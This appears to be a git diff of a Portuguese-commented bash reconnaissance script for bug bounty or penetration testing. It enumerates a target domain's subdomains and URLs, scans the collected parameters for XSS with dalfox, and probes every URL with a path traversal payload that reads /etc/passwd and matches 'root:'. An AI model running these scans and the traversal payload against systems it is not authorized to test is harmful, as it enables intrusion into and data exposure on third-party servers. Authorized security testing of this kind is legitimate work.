@@ -1,18 +1,29 @@
 #!/bin/bash
 
-/home/kali/tools/brutefinder.sh $1
+#------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------# 
+amass enum --passive -d $1 -o domains_$1
+assetfinder --subs-only $1 | tee -a domains_$1
+
+subfinder -d $1 -o domains_subfinder_$1
+cat domains_subfinder_$1 | tee -a domains_$1
+
+sort -u domains_$1 -o domains_$1
+cat domains_$1 | filter-resolved | tee -a domains_$1.txt
+#------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------# 
+
+#subdomain takeonver
+#filtro de sudominios online com httprobe
 
 cat domains_$1 | gau --subs --threads 5 | tee allUrls.txt; 
 
-cat allUrls.txt | grep -i "\.log$" | tee log.txt;
-cat allUrls.txt | grep -i "\.bak$" | tee bak.txt;
-cat allUrls.txt | grep -i "\.xlsx$" | tee xlsx.txt;
-cat allUrls.txt | grep -i "\.js$" | tee jsfiles.txt;
-
-#cat domains_$1 | grep -i "\.<extensao>$" allUrls.txt | tee log.txt;
+#cat allUrls.txt | grep -i "\.log$" | tee log.txt;
+#cat allUrls.txt | grep -i "\.bak$" | tee bak.txt;
+#cat allUrls.txt | grep -i "\.xlsx$" | tee xlsx.txt;
+#cat allUrls.txt | grep -i "\.js$" | tee jsfiles.txt;
+#cat domains_$1 | grep -i "\.<>$" allUrls.txt | tee log.txt;
 
 grep "=" allUrls.txt | tee allParams.txt; # Encontrar parametros que recebem algo
-cat allParams.txt | Gxss -c 100 -o reflected.txt; # Encontrar parametros que refletem caracteres para xss
+cat allParams.txt | dalfox file allParams.txt -o xssTest; # Encontrar parametros que refletem caracteres para xss
 httpx -l allUrls.txt -path "/////////////../../../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt; # Validar Path Transversal
 
 
